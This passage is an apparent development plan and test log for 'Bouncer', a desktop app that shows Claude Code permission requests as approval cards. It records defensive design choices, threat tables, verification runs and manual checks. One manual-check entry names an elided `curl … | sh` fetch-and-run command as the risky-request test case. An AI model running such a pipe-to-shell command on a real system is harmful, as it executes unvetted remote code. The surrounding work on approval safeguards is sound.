| Idle CPU / battery | Loop only while moving; breathe settles after ~10 s; blinks from one timer; measured |
| Motion sickness | OS reduced motion: no bounce, breathing, tracking, blink or greeting drop |
| Secret fragment kept in the log (`redact.rs`) | `json_values` ends a quoted value at the first `"` that isn't escaped (`\"`); fake-secret test built at run time |

`redact.rs` fix: `json_values` finds the closing quote with `find('"')`,
so in `"password":"ab\"cd"` it stops at the escaped quote and `cd` survives.
It must skip quotes preceded by an odd number of backslashes.

Phase 5a is done when:

- [x] All seven moods match "Meet Bouncer" (side-by-side screenshots at 84 px)
- [x] Physics bounce stable at any frame rate (tests); squash / stretch to spec
- [x] Eyes look toward the cursor, blink, squish, dizzy, greeting, done cheer
- [x] Reduced motion: no bounce, breathing, tracking, blink or drop
- [x] Idle CPU ~0% measured over 60 s (hidden strip, idle pill)

Verify (2026-10-03, Windows, debug app + Vite dev, fixtures fed through the
relay on a private test pipe, scratch `BOUNCER_RULES`; page inspected over
WebView2's debug port, debug builds only):

- Idle CPU, 60 s, app + all WebView2 processes: hidden strip ~0 ms; idle
  pill 235 ms = 0.39% of one core (was 0.65% before blinks became two
  repaints; 0.1% with blinks off). The page requests no frames once settled
  except the blink's two repaints.
- Approval card: Allow disabled → enabled 604 ms after the card's first
  paint; nothing focused (`document.activeElement` is `BODY`); the ball's
  box never overlaps the card or its buttons (ball bottom 32 px, card top
  37 px) for a plain and a risky card; a card sent during the greeting
  replaces it at once.
- Reduced motion (emulated): 0 frames in 3 s while working, still pose;
  60 fps again when it's turned off.
- Moods in the app: greeting, idle, working, done (cheer tilt), needs ("!"),
  risky (red, flat mouth); all seven on `design/sheet.html` next to the
  prototype's "Meet Bouncer": same shapes and colors.
- Diff reread: no `innerHTML`, no `focus()`, ball text is static ("z", "!");
  the sheet page is dev-only (not in `dist`).

Manual checks (Charan, 2026-10-03, Claude Code 2.1.289, Windows, debug app,
playground session in `default` permission mode):

- [x] Launch greeting (seen after a page reload; in dev the first load can
  take up to ~40 s on a busy machine, so the greeting comes then)
- [x] Working: jumps while Claude Code works
- [x] Needs you: card with the hopping "!" (`curl … | head -40`); Deny
  reached Claude Code ("Denied by PermissionRequest hook")
- [x] Mouse: face follows the cursor and recentres, a click squashes without
  opening the island, four clicks make him dizzy, the label opens the list
- [x] Paused: grey, eyes shut, "z", doesn't look
- [x] Reduced motion (Windows "Animation effects" off): no motion
- [x] Idle: Task Manager shows Bouncer at 0%
- Not seen live: risky (Claude Code rewrote `curl … | sh` into `curl … |
  head -40`, which isn't risky; covered by the 2.1.288 fixture in the app),
  the cheer when a session finishes (not reported). `git status` ran
  without a request (Claude Code allows it on its own) and `hello.txt`
  already existed, so the first prompt raised no card.
- Feedback: the pill and the whole island feel small. Changed (decision 7: one 125% island scale).
- [x] Re-check (Charan, 2026-10-04): the session list at 125% and the
  word-free greeting (Bouncer alone, centred in the pill) look good.
- [x] Approval card at 125% (Charan, 2026-10-04, a real Write request):
  same proportions as the prototype, Bouncer clear of the card, Allow armed,
  the path wraps in its box. Not re-checked at 125%: the session detail.
- [x] An approval card is never covered, moved, delayed or unfocused (tests + by hand)
- [x] `json_values` skips escaped quotes, with a run-time fake-secret test
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked before every push (merged as #10, tagged v0.5.0)


### Phase 5b audit (2026-10-04)

Scope (Charan): sounds; the settings screen with **Size**; the observe /
auto switch; keyboard access; screen reader order; contrast. Sources:
`main.rs` (tray, window, commands), `rules.rs` (`add`, `replace`, owner
checks), `hooks.rs` / `bin/bouncer.rs` (hook install), `styles.css`,
`size.ts`, the prototype (no settings screen in it yet), tauri 2.12.1
(`set_focusable`, `set_focus`, `additionalBrowserArgs`).

What exists: the window is created `focusable: false` (Phase 2: a card
never takes the keyboard, and one click on Allow / Deny leaves typing in
the terminal); the tray has Pause, Wipe history, Quit; `mode` lives in
`rules.toml`, written only by hand or by "Always allow" (`rules::add`:
read-back check, temp file + rename, owner-only); no sound; `size.ts` has
`SCALE = 1.25`.

Findings:

1. **No settings screen in the prototype.** The design rule says the
   prototype comes first: I draft a "Settings" state there (same tokens,
   rows, switches) and show it before building.
2. **Contrast (≥ 4.5:1) fails in three places**, measured from the
   prototype's colors: faint text `#6B7280` is 4.02 on the island and 3.61
   on raised (times, steps, notes); code line numbers `#4B5261` are 2.48;
   white on the red "rules" badge is 3.36. Smallest fixes: faint →
   `#7B8290` (5.04 / 4.52), line numbers → faint, the badge text → island
   color (5.79). Prototype first.
3. **Keyboard access without stealing focus.** `set_focusable` exists in
   tauri 2.12.1, so no plugin: the island stays non-focusable and becomes
   focusable only when the user opens it on purpose: tray "Open Bouncer" /
   "Settings…" (the tray is keyboard-reachable: Win+B on Windows) or the
   island's gear button. Esc or clicking elsewhere makes it non-focusable
   again. Clicking a card's buttons keeps today's behavior (typing stays in
   the terminal). A card arriving never moves focus. A global hotkey would
   need `tauri-plugin-global-shortcut` (a new dependency): not proposed.
4. **Sound and autoplay.** Web Audio, generated, no files. A page that was
   never clicked may not be allowed to start audio (Chromium autoplay
   policy); checked first in Implement. If blocked, the fix is a WebView2
   argument in `tauri.conf.json` (`--autoplay-policy=no-user-gesture-required`,
   keeping Tauri's own default arguments), no dependency. The AudioContext
   is suspended after each sound, so idle CPU stays ~0. macOS → Mac checks.
5. **Preferences (Size, Sound) need a home.** `rules.toml` is security
   policy; preferences go in their own `preferences.json` next to it
   (`serde_json`, already a dependency), with the same owner check and
   atomic write. Bad or missing file → defaults (Medium, sound on). Size
   is one of three values, never a free number.
6. **Mode switch** reuses the rules write: a new `set_mode` command takes
   only `"observe"` / `"auto"`, changes the one `mode = ...` line (or adds
   it), checks the file reads back as the same rules with the new mode,
   then replaces it atomically. The island shows the change like any edit.
7. **Not in Charan's 5b list, from the old plan:** hooks install /
   uninstall and "rules file" in settings. Installing from the island means
   writing `~/.claude/settings.json` with a diff + confirm in the island
   (security rule 6); opening the rules file in an editor needs an opener
   plugin (new dependency). Proposed: settings shows the rules file's path
   (text, copyable) and whether hooks are installed; install / uninstall
   stays in the `bouncer` CLI for the MVP.

Decisions (Charan, 2026-10-04):

1. **Keyboard on cards:** Tab order Deny, then Allow. Space on Allow works
   only once it is armed; Enter never approves. If the card in front
   changes while the island has focus, focus moves to the new card's Deny
   and Allow re-arms for 600 ms. "Always allow…" stays reachable and keeps
   its own confirm step (which arms too).
2. **Settings screen:** Size, Sound, Observe / Auto, Wipe history, and the
   rules file's location as plain copyable text. Hooks: status only
   ("installed" / "not installed: run `bouncer install-hooks`"). Install /
   uninstall stays in the CLI and moves to the Phase 9 installer; no button
   writes `~/.claude/settings.json` in 5b.
3. **Three sounds only:** needs you (a card, or a question in the
   terminal), risky (different, sharper), done (soft). None for
   auto-allowed or working, none while paused. One sound at a time;
   a repeat within 2 s is dropped.
4. **Contrast fixes as proposed** (faint `#7B8290`, line numbers use faint,
   red badge text dark), prototype first.
5. **Settings design approved** (prototype v0.8) with three fixes: the
   spec tables read on one line at any page width; Settings scrolls inside
   the island and the auto-allow confirm scrolls fully into view (at 125%
   on a 768-px-tall screen its buttons are fully visible: the island is
   never taller than the work area, then it scrolls); in the confirm, focus
   goes to Cancel, Esc cancels, Enter never turns auto on (spec rule 11).
6. **Sizes lowered** (Charan, after seeing 125% Settings): Small 100% /
   Medium 112% (default) / Large 125%. Settings is compact on its own (one-
   line hints, the rules path in 11-px wrapping mono, tighter rows), so at
   Medium it fits a 768-px screen without scrolling (checked: 507-px window
   on a 720-px work area, even with a 150-character dev path). Prototype
   v0.9 first.

Threats (5b):

| Threat | Fix |
| --- | --- |
| Auto mode switched on by accident | Turning auto on asks first (what auto means, risky still asks), and its confirm button arms like Allow (600 ms); turning it off doesn't ask |
| The page writes arbitrary text into `rules.toml` | `set_mode` takes an enum only; the backend edits the file and checks it reads back as the same rules with the new mode |
| Keyboard approves by accident | Allow is never focused automatically, Enter never approves (keydown blocked on Allow and "Add rule and allow"), Space only once armed; a new card in front while focused moves focus to its Deny and re-arms Allow; with no focus, a card's arrival never moves focus |
| The island takes the keyboard from the terminal | Focusable only after the user opens it on purpose; non-focusable again on Esc / blur; card buttons keep working without focus |
| `preferences.json` tampered or broken | Owner check as for `rules.toml`; only known values accepted, anything else → defaults |
| Sound wakes the CPU / annoys | Three short generated sounds, one at a time, repeats within 2 s dropped, context suspended after; mute saved; none while paused |
| Unreadable text | All text ≥ 4.5:1 (fixes above); color is never the only signal (existing rule) |
| Screen reader reads the island out of order | DOM order = reading order (head, card: who, what, reason, command, buttons); the card is announced once on arrival (`aria-live` polite, already on the island) |

7. **The settings button is a cog** (Charan): the first icon, a circle with
   eight rays, read as a light / dark theme switch. Prototype v0.10 first.

Verify (2026-10-04, Windows 1366 × 768, debug app, fixtures through the
relay on a private test pipe, scratch `BOUNCER_RULES`; page driven over
WebView2's debug port with focus emulated, so the OS focus was never taken):

- Settings at Medium (112%): 493 × 572 window on a 720-px work area, no
  scrolling; with the auto-allow confirm open the body scrolls and both
  confirm buttons are fully in view; focus on Cancel.
- Size: Small / Medium / Large saved to `preferences.json` and applied at
  once; Large is capped to 137% by the 40% rule on a 1366-wide screen.
- Mode: confirm opens in view, focus on Cancel, "Turn on" disabled for
  600 ms, Esc cancels, Enter does nothing, turning on writes `auto` (only
  that line), turning off doesn't ask; the island shows "Rules changed".
- Sounds: a new card → two sine notes, risky → two triangle notes, a
  finished session → one bell, muted → none; the audio context is
  suspended ~0.5 s after each. WebView2 lets an unclicked page play sound,
  so no browser argument was needed.
- Keyboard: a new card focuses its Deny; Tab skips an unarmed Allow and
  stays inside the island; Enter on an armed Allow does nothing; Space on
  Deny denies, Space on an armed Allow allows; the next card after a
  decision focuses its Deny and re-arms; settings controls in order, focus
  kept across re-renders; Esc closes settings and the list.
- Found and fixed: a card queued behind the "Allowed / Denied" message
  could arm while hidden (older than 5b); it now arms when it appears.
- Idle CPU, 60 s, app + WebView2: hidden strip 78 ms (0.1%), idle pill
  250 ms (0.4%, the blinks); no change from 5a.
- Contrast: every text color ≥ 4.5:1 on island and raised (faint 5.04 /
  4.52, risky badge 5.79); the "!" icon in a risk reason is a graphic
  (3.36, over the 3:1 for icons).
- Diff reread: no HTML sinks; every new command takes known values only
  (size names, mode names, booleans); the hook status reads Claude Code's
  settings file (≤ 1 MB) and returns only a word.

Manual checks (Charan, 2026-10-04, Claude Code 2.1.289, Windows):

- [x] Tray "Settings…": Tab moves through the controls; Size changes at once
- [x] After clicking the terminal, Esc goes to the terminal (the island gave
  the keyboard back, as designed; an open confirm stays until Cancel)
- [x] A real Write card: Tab skips the unarmed Allow (ring on "Always allow…")
- Reported "Enter and Space both turn auto on / off". Re-checked with real
  key presses over the debug port: Enter on the switch turns auto off (off
  never asks) and only opens the confirm when it's off; Enter on "Turn on
  auto-allow" does nothing; only Space or a click turns auto on. Found on
  the way: focus fell to nothing when a confirm closed; it now returns to
  the switch (or "Wipe…").
- [x] Second round (Charan, 2026-10-04): the soft "needs you" notes on a
  card; tray "Open Bouncer"; Tab order Deny → Allow once → Always allow;
  Enter does nothing on Allow, Space allows; the "done" bell; the risky
  card; mute; Narrator reads the island when you go to it.
- Found: opening from the tray with a card up didn't put focus (or the
  ring) on Deny; now it does, and the ring shows whenever the island has
  focus (it only has focus when opened on purpose).
- Narrator doesn't announce a new card by itself: the island never takes
  focus, and Narrator speaks live regions of the focused window. Decision
  (Charan): accept for now; the sounds alert; revisit in Phase 9.
- "Still asking in the terminal" after answering No there: Claude Code
  sends nothing after a No in its own prompt (no Stop either), so Bouncer
  can't know; "Waiting in terminal" after 2 quiet minutes, cleared by the
  session's next event (Phase 4 limit). A Yes after a timeout sends
  PostToolUse and clears it (no live recording yet; unit test). Found and
  fixed: a Yes in Claude Code's prompt while the card was still up left the
  card for ~100 s and then marked the session "asks in terminal"; now the
  tool's PostToolUse (same tool and input), Stop, a new prompt or the
  session's end clears that card ("answered in terminal").

Phase 5b is done when:

- [x] Settings state in the prototype, approved; then built to it (Size,
  Sound, Observe / Auto, Wipe history, rules file path, hook status)
- [x] Size Small / Medium / Large, saved, applied at once (40% cap kept)
- [x] Sounds (needs you, risky, done), generated; mute saved; none while
  paused; one at a time, repeats within 2 s dropped; idle CPU still ~0%
- [x] Observe / auto switch: confirm to turn on, `set_mode` checked write
- [x] Keyboard: open from the tray, Tab through settings and cards, Esc
  closes; Enter never approves; Space on Allow only when armed; a new card
  moves focus to its Deny; focus never taken from the terminal by a card
  (debug port + Charan by hand)
- [x] Contrast ≥ 4.5:1 everywhere (prototype first); screen reader order
  checked by hand (Narrator reads the island in order when you go to it; it
  doesn't announce a new card by itself: accepted, Phase 9)
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  before every push (local green: 130 Rust + 36 frontend; gitleaks clean)

## Phase 5c — Island motion

Charan, 2026-10-04. Its own PR, all four stages, after 5b is merged.

- **Grows out of the top edge** like the prototype: hidden → peek on
  hover → pill → open, morphing with the 320 ms spring. Growing: resize the
  window first, then animate inside it. Closing: animate first, then
  shrink the window.
- **Never animate an approval card's arrival**; the 600 ms arm still
  counts from when the card is fully visible.
- **The ticker** (the pill's step label) shows `+N −M` line counts for Edit
  / Write, computed from the hook input (Edit: old vs new text; Write: the
  new text's lines, since the old file is never read). Only the numbers are
  stored (two new activity-log fields), never the text.
- **Reduced motion** turns all of it off.
- Audit to settle: what "fully visible" means in the window-resize timing;
  where `+N −M` sits in the pill; MultiEdit; the activity-log field change.

### Phase 5c audit (2026-10-04)

Sources: the prototype (`.island` transitions, `.body` rise, Build spec
"Motion"), `main.ts` (`setShape`, `report`, `front` / arm, peek),
`styles.css`, `main.rs` (`fit`, `lay_out`, `place`), `code.rs` / `diff.rs`,
`activity.rs` (`Entry`), `approvals.rs` (session step and code pane).

What exists: width and corner radius move with a CSS transition (320 ms
spring, 200 ms ease-out when closing); height jumps. While the width moves,
the page reports a new size on every frame and `growUntil` keeps the larger
one, so the window is resized ~20 times per change and grows *with* the
island, not before it. `.body` and `.detail` replay the 6-px "rise" every
time they're rebuilt: when a card arrives (an animated card arrival) and on
every 30-s clock re-render. The hidden strip sits at the screen's top edge,
every other state 8 px below it, so hidden → pill moves the window.

Findings:

1. **The prototype has no height morph, no window and no peek.** Drawn
   first (v0.11): a "Phase 5c" row with "Play: wake, open, close" (strip →
   peek → pill → sessions → ticker pill → strip), the ticker pill, "Show
   window" (a dashed box for the OS window), "Slow ×4" (to see the order)
   and "Reduced motion". Hovering the strip for 300 ms peeks the pill.
2. **The morph is one Web Animation** on the island (width, height,
   min-height, top, radius, color) from the box it had to the box it gets:
   native, no dependency. Growing: 320 ms spring; closing: 200 ms ease-out
   (spec). A change in the middle starts from where the island is.
3. **Window order.** Growing: the page asks for the larger of the current
   and new size, the island waits at its old box until the viewport is that
   big (the page's `resize` event; 150 ms at most), then animates. Closing:
   the island animates inside, then the page asks for the new size. Two
   window resizes per change instead of one per frame. The spring
   overshoots ≤ 3% of the change (the curve peaks at 1.03): at most ~7 px a
   side for pill → wide, inside the 20 / 32 px shadow margin, so never cut.
4. **Grows out of the top edge.** The 8-px gap moves inside the window
   (top padding) and the window sits at the work area's top edge, so strip
   and pill share the window's top and the morph is continuous, like the
   prototype's `top: -1 → 8`. Cost: an 8-px transparent band above the
   island that takes clicks (the shadow margin already does on three
   sides). An island dragged elsewhere still hides to the top-centre strip
   (as now); it grows from its own top edge at its spot.
5. **A card is never animated in.** A card at the front (new, or the next
   one after "Allowed / Denied") is drawn at full size at once: no morph,
   no rise, one window resize. Nothing morphs while a card is in front, so
   its buttons never move. **"Fully visible"** = the viewport holds the
   whole island (2-px tolerance); the 600 ms arm starts then, not when the
   card was drawn (today: drawn). Until then Allow is disabled with an empty
   fill. The backend's own 600 ms counts from the request, earlier, so the
   page stays the stricter one. If the window never gets big enough, Allow
   never arms: fail safe (Deny and the terminal still work).
6. **Rise only when growing**, never on a re-render or a card (fixes the
   replay every 30 s).
7. **`+N −M`.** `code::line_counts(tool, input)` with the code pane's own
   `line_ops`: Edit old vs new; MultiEdit the sum over its edits; Write
   `+N` only (the old file is never read, so no `−`); NotebookEdit and other
   tools none; `replace_all` counts once (how many places needs the file).
   The session view sends `lines: [added, removed | null]`; the activity log
   gets two optional numbers `added`, `removed` (old day files still read;
   missing = none). In the pill: after the label, before a badge, 12-px mono
   tabular, `+N` green, `−M` (U+2212) red; the label shortens first, the
   numbers are never cut; the signs are the words. Only on the working pill
   for the session it shows; not in rows or the rail (not asked).
8. **Huge edits** (found on the way): `line_ops` keeps an n × m table; a
   10,000-line edit is a 400 MB table, and 5c would run it up to three times
   per edit (code pane, ticker, log). Proposed: above 1,000,000 cells it
   treats the edit as a whole replacement (all old lines `−`, all new `+`),
   so the pane and the counts stay correct-ish and memory stays ≤ 4 MB.
9. **Reduced motion:** no morph, no rise, the window resizes in one step
   (as today); the arm still counts from fully visible. Read live from
   `matchMedia`, so a change applies at once.
10. **Hidden means hidden:** the animation ends; no frame loop, no timers.

Threats (5c):

| Threat | Fix |
| --- | --- |
| An animation hides or delays a card, or moves its buttons | A card's arrival is never animated; nothing morphs while a card is in front; the arm starts when the card is fully visible |
| A click lands on Allow during a resize | Allow is disabled until 600 ms after the card is fully visible; the backend refuses an allow within 600 ms anyway |
| Window and island disagree (cut-off island, clicks lost) | Window grows to the larger size before the island moves, shrinks only after it stops; overshoot fits the shadow margin |
| Line counts carry agent text | `line_counts` returns two integers; the log stores numbers only (test) |
| A huge edit eats memory in the app | `line_ops` table capped at 1,000,000 cells, then whole-replacement counts |
| Motion sickness | Reduced motion: no morph, no rise, no overshoot |
| Idle CPU | Web Animations run only during a change; settled or hidden, nothing runs |

Decisions (Charan, 2026-10-04): prototype v0.11 approved, and all three
proposals: (1) the 8-px gap goes inside the window; (2) the line counts as
in finding 7; (3) `line_ops` capped at 1,000,000 cells.

Verify (2026-10-04, Windows 1366 × 768 at 100%, debug app built to a
scratch target and run beside Charan's own dev instance, fixtures through the
relay on a private test pipe, scratch `BOUNCER_RULES`; page sampled every
frame over WebView2's debug port; the OS focus was never taken):

- Strip → pill (a session starts): the window grew to 368 × 88 while the
  island was still the 5-px strip, then the island sprang open (top 0 → 9,
  peak 3 px over) and settled in ~330 ms; nothing left running.
- Pill → open: window 493 × 164 first, then the spring (peak 4 px over,
  inside the shadow margin). Open → pill: 200 ms ease-out inside the held
  window, then the window shrank.
- A card: drawn at full size in one frame, no animation; Allow stayed
  disabled with an empty fill until the window held it, the fill started
  then, and Allow was armed 617 ms after fully visible. Once (the first
  card after launch) the window took ~2 s to grow: Allow kept waiting the
  whole time, as designed.
- "Always allow…" with a card up: no morph; its button arms in 600 ms.
- Ticker: Edit `+3 −1`, Write `+4` only, Bash none; with a long file name
  the label shortens and the numbers stay whole (screenshot to Charan).
- Reduced motion (emulated): open and close in one step, no animation.
- Hidden: no animations, the window is the strip. The pill's window sits at
  the work area's top (0) with the island 9 px down inside it (8 × 112%).
- Idle CPU, settled idle pill, app + WebView2: 78 ms in 30 s (0.26%).
- Found and fixed: on Deny, the backend's next view (card gone) arrived
  before `decide` answered, so the pill flashed and the island grew back
  for "Denied" (a one-frame flash before 5c, a visible bounce with the
  morph). The message now shows from the press and is dropped if the
  backend refuses.
- Diff reread: no HTML sinks; the ticker is two numbers rendered with
  `textContent`; the log gains two integers; `line_ops` capped.

Manual checks (Charan, 2026-10-05, Claude Code 2.1.289, Windows):

- [x] A Write card appears at once; Allow's fill starts once it's fully
  shown; Deny shows "Denied" at once (no pill flash), then the island shrinks
- [x] "Always allow…" opens its preview with nothing moving
- [x] Tray "Open Bouncer" with a card up: the ring is on Deny at once
- Found: hovering the wake strip with no session made it flicker between
  strip and pill (the × too). Cause: with the gap inside the window, a mouse
  resting on the strip is in the gap above the peeked pill, which counted as
  leaving the island. Fixed: the peek ends when the mouse leaves the window
  (reproduced and re-checked over the debug port).
- Found: in Session detail the diff lines sat side by side in narrow green
  columns: the ticker's `.lines` class clashed with the code pane's. Fixed
  (renamed `.ticker`, prototype too); checked in the real window.
- [x] Strip hover (after the fix), drag, reduced motion; the ticker shows
  on the pill (with every edit needing a card, the card covers it: seen with
  "accept edits")
- Asked (Charan): react faster on hover. Decision: the pill peeks after
  **200 ms** (was 300; prototype v0.12 first).
- Found: closing (and opening) shows the pill ~60 px to the side, cut off,
  for one frame. Filmed and measured (Bouncer's x in every frame): when the
  window moves, WebView2 shows its old picture at the new spot for a frame.
  Moving and resizing in one native `SetWindowPos` call didn't help. Known
  limit of 5c. Decision (Charan): merge 5c as is; fix it in its own small
  PR right after, before 5d (see "Island window region" below).

Phase 5c is done when:

- [x] Prototype v0.11 approved (morph, window order, peek, ticker, reduced motion)
- [x] Strip → pill → open → wide grow from the top edge with the 320 ms
  spring, close with 200 ms ease-out; window grows first, shrinks last
- [x] A card appears at once; its arm counts from fully visible; nothing
  morphs under a card (checked over the debug port, frame by frame)
- [x] `+N −M` on the pill for Edit / MultiEdit, `+N` for Write; two numbers
  in the activity log, never the text; old log files still read
- [x] `line_ops` capped for huge edits
- [x] Reduced motion: all off; idle CPU still ~0%
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  before every push (local green: 137 Rust + 41 frontend; gitleaks clean)

## Island window region (after 5c, before 5d)

Charan, 2026-10-05. Its own small PR. Fixes 5c's one-frame jump: on
Windows the window stops moving while the island shows; it keeps one fixed
size and a window region (`SetWindowRgn`) marks the island's part. Outside
the region nothing is drawn and clicks reach the window underneath (tested
by hand on the test window with `WindowFromPoint`: outside → the window
below; on the pill → Bouncer).

- Windows only; macOS keeps resizing until it's tested there.
- The `unsafe` Windows calls live in one small module.
- Fail safe: if any region call fails, fall back to today's resizing; never
  leave a big invisible window catching clicks.
- A test that the region always contains the card's buttons.
- Prove with `WindowFromPoint` that clicks outside the island reach the
  window underneath.

### Island window region audit (2026-10-05)

Sources: `main.rs` (`fit`, `lay_out`, `place`, `keep_on_screen`, drag),
`main.ts` (`report`, `settle`, `armIfVisible`), `size.ts`, tauri 2.12.1 /
tauri-runtime-wry 2.12.1 / tauri-macros 2.7.1 sources.

What exists: the page reports its box (island + shadow margin + top gap) and
the window is resized and moved to exactly that box, so every width change
moves the window's left edge (the one-frame jump).

Findings:

1. **The frame.** The window gets one size that fits every view at the
   current Size and screen: the widest and tallest page (pill, open, wide,
   each at its own scale), computed by the page in `size.ts` and sent with
   the box. The box is drawn top-centred in it (as now), so only the region
   changes between views; the window moves only when the Size, the screen,
   hidden ↔ a dragged spot, or a drag changes it. With the island at its
   usual top-centre spot, hiding to the strip doesn't move it either.
2. **Region = the box**, in window pixels, top-centred. The frame is
   centred on the box and never passes the work area (the box's own
   monitor), so it can't straddle monitors with another DPI. Near a screen
   edge the frame narrows (then a width change there can still jump once).
3. **"Fully visible" needs a new signal**: the viewport is the frame now,
   always bigger than the card. `fit` is a sync command, so it runs on the
   main thread, and `run_on_main_thread` runs inline there
   (tauri-runtime-wry `send_user_message`): when the page's `fit` call
   returns, the region is set. The page keeps the last confirmed size; the
   arm starts when it holds the card (and the viewport does), and a grow
   morph starts when its `fit` returns (150 ms at most, as now).
4. **One small `unsafe` module** (`crates/app/src/region.rs`, Windows only):
   `SetWindowPos`, `CreateRectRgn`, `SetWindowRgn`, `DeleteObject`, declared
   from `user32` / `gdi32` (system libraries, no new crate). The geometry is
   a plain function next to it, tested.
5. **Fail safe:** if the handle or any call fails, the window goes back to
   exactly the box (today's resizing) and any region is removed, so a big
   invisible window never catches clicks. A refused region is freed.
6. **Drag:** the user drags the frame; the anchor is still its top centre.
   "Out of reach" is judged from the box's centre, not the frame's.
7. macOS: unchanged (resizes to the box) until it's tested there.

Threats:

| Threat | Fix |
| --- | --- |
| A big invisible window catches clicks | Region = the box; any failure → window back to the box, region removed |
| A card shows (or arms) clipped by an old region | Arm starts only after the `fit` holding the card has returned (region set) |
| The frame crosses monitors (DPI change) | Frame kept inside the box's work area |
| Leaked GDI region | Freed when `SetWindowRgn` refuses it (the system owns it otherwise) |
| `unsafe` misuse | One module; only our own window handle, on the main thread; no pointers but the handle |

Verify (2026-10-05, Windows 1366 × 768 at 100%, debug build in a scratch
target beside Charan's dev app, private test pipe; window and region read
with `GetWindowRect` / `GetWindowRgnBox`, clicks checked with
`WindowFromPoint`, nothing clicked):

- Strip, pill and open list: the window stayed at 303,0 760 × 628 for all
  three; only the region changed (204 × 6, 370 × 88, 495 × 164).
- Clicks: inside the region → Bouncer; 15 px left of it and 15 px below it
  → the window underneath, in every view.
- A drag (the frame moved to mid-screen): the island followed, and the frame
  shrank to the work area (760 × 470).
- Filmed three opens and three closes at that spot and tracked Bouncer's x
  in every frame: no frame jumps off and back (the same check catches 5c's
  jump, 156 → 218 → 156).
- A card: drawn in one frame with Allow waiting; the arm started when the
  `fit` showing it returned (one frame later), armed 602 ms after. Deny,
  Allow once and Always allow… all lie inside the region on screen.
- Fallback (`BOUNCER_NO_REGION=1`, debug only): no region, the window is
  exactly the island's box again (368 × 88, 493 × 164); a click just
  outside it reaches the window underneath.
- Idle CPU, settled idle pill, app + WebView2, 60 s: region on 1.28% /
  1.41%, region off 1.38%: the region adds nothing. (Higher than 5c's
  single 30-s 0.26% on a busier machine: Charan's dev app ran alongside.)
- Diff reread: the only `unsafe` is `region::win` (four Windows calls on our
  own handle, main thread); a refused region is freed; every failure path
  clears the region and sizes the window to the box.

Manual checks (Charan, 2026-10-05, Claude Code 2.1.289, Windows):

- [x] Open / close and session detail: no flicker or jump
- [x] Clicks right next to and below the island reach what's underneath
- [x] Drag the island, open / close there
- [x] Strip hover (200 ms); a card arrives and arms as before
- Asked: a minimize / maximize / close set next to the island. They're the
  terminal's own caption buttons behind it (Bouncer's window has no
  decorations); visible in the 5c screenshots too.

Done when:

- [x] Opening and closing (pill ↔ open ↔ wide) never move the window; filmed
  and measured: no one-frame jump
- [x] `WindowFromPoint`: outside the island → the window underneath; on the
  island → Bouncer
- [x] A test that the region always holds the card's buttons
- [x] Forced failure falls back to box-sized resizing (test + by hand)
- [x] Arm still counts from fully visible; idle CPU unchanged by the region
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  (local green: 142 Rust + 42 frontend; PR 13 CI green, merged 2026-10-05)

## Phase 5d — Sound pack

Charan, 2026-10-04. Its own PR, all four stages, after 5c is merged. 5b
ships the first three sounds (needs you, risky, done) as they are.

- **Theme: Bouncer is a club bouncer.** Sounds are funny and still say what
  happened (Charan, 2026-10-04).
- **All generated in code (Web Audio), no files**, each under ~1 s, nothing
  copied from Coucou or anywhere else.
- **Starting set** (Playful style):

  | Event | Sound |
  | --- | --- |
  | Launch | "yo!" whistle |
  | New session | door chime |
  | Needs you (card or question) | knock-knock + rising "ahem?" |
  | Risky request | record scratch + low buzzer |
  | Allowed | velvet rope "pop" + ding |
  | Denied | door slam "bonk" |
  | "Always allow" rule added | VIP stamp "ka-chunk" |
  | Auto-allowed | tiny click (off by default) |
  | Session done | mini "ta-da!" |
  | A tool failed / error | sad trombone |
  | Welcome back (away summary) | rising "heyyy" |
  | Poke (click on Bouncer) | boing |
  | Dizzy | cartoon whirl |
  | Paused | snore "zzz" |
  | Resumed | "bip-bip!" |
  | Auto-allow turned on | "cha-ching" |
  | History wiped | one of three, Charan picks: shredder "brrrt" / eraser squeak + "poof" / broom "swish" (each < 0.6 s) |

- **Styles:** Soft (default) and Playful (Charan, 2026-10-06: Retro
  dropped). Soft is the same ideas with the same rhythm and contour, a
  gentler timbre, 3 dB quieter.
- **On by default** (Charan, 2026-10-06): needs you, risky, done, tool
  failed, welcome back, launch "yo!". Everything else starts off and is
  turned on per sound in Settings.
- **Risky and needs you stay clearly different from the fun ones** (lower,
  harsher, insistent), so they're never ignored, in every style. In Soft
  they are less harsh, never easy to miss (Charan, 2026-10-06).
- **Settings:** volume, the style choice and per-sound on / off.
- **Rules:** never more than one sound at a time; a repeat within 2 s is
  dropped; frequent events stay quiet by default; nothing while paused;
  idle CPU ~0% (the audio context suspended between sounds).
- **Design first:** a listen-and-pick page in the prototype with every sound
  in every style, so Charan hears them all before they're built.
- Audit to settle: which events are "frequent" (auto-allowed, session
  started?), what "a tool failed" is in the hook data, the greeting sound
  vs the no-sound-at-launch rule (5b: the first view is quiet), and how
  volume and per-sound choices are stored (`preferences.json`).

### Phase 5d audit (2026-10-06)

Sources: this section, `sound.ts` (`cue`, `allowed`, `play`), `main.ts`
(where `cue` runs, the greeting, `savePrefs`), `prefs.rs`, `hooks.rs` (the
hook events we install), the 2.1.288 "denied in terminal" fixture, the
prototype (Settings, Build spec).

What exists (5b): three cues (needs you, risky, done) from two sine /
triangle notes each; one master on / off in `preferences.json`; one sound
at a time, a repeat within 2 s dropped, nothing while paused, the audio
context suspended after each sound; the first view only records what's
known (a reload stays quiet).

Findings:

1. **Order.** Design first: the listen-and-pick board goes into the
   prototype (v0.13; v0.14 after the first listen: two styles, three wipe
   options) with every sound in every style, made the same way the
   app will make them (oscillators, filtered noise, envelopes; no files, no
   samples). Charan marks each one keep / change. Nothing goes into the app
   until every sound is a keep.
2. **One recipe per sound, two styles.** Each sound is written once as a
   list of parts (tone or noise, timing, pitch contour); the style only
   changes the timbre: Playful as written; Soft = sine, slower attack,
   quieter, darker noise, 3 dB below Playful. So rhythm and contour can't
   drift between styles.
3. **Alarms grab attention in every style.** Needs you and risky mark
   their parts as alarms. In Soft they keep their wave (the buzz), lose only
   the harsh top (low-pass at 2.2 kHz), keep a quick attack, and play at the
   same level as in Playful: 2 dB above Playful's other sounds, 5 dB above
   Soft's (measured offline: −21.1 vs −26.1 dB RMS). Risky stays the
   lowest sound in the set. Both stay under 1 s.
4. **"A tool failed" has no event yet.** Bouncer installs `SessionStart`,
